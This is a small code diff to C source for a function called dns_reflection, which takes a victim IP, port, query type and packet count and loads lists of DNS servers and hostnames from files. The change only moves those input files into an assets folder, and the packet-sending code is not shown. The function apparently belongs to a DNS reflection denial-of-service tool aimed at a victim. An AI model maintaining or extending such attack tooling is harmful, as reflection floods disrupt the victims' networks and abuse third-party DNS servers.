@@ -15,7 +15,7 @@ void dns_reflection(char * victimIP, int victimPort, int query_type, int nPacket
 	unsigned char hostNames[20][30];
 	int nDns, nHost;
 	//load dns servers
-	FILE * dnsIPs = fopen ("dns_ips.txt", "r");
+	FILE * dnsIPs = fopen ("assets/dns_ips.txt", "r");
 	int i = 0;
 	while(i < 20 && fgets(dnsServers[i++], 20, dnsIPs)){
 		if (dnsServers[i - 1][strlen(dnsServers[i - 1]) - 1] == '\n'){
@@ -28,7 +28,7 @@ void dns_reflection(char * victimIP, int victimPort, int query_type, int nPacket
 	printf("%d dns servers loaded.\n", nDns);
 
 	//load hostnames
-	FILE * hostNameFile = fopen ("dns_hosts.txt", "r");
+	FILE * hostNameFile = fopen ("assets/dns_hosts.txt", "r");
 	i = 0;
 	while(i < 20 && fgets(hostNames[i++], 20, hostNameFile)){
 		if (hostNames[i - 1][strlen(hostNames[i - 1]) - 1] == '\n'){
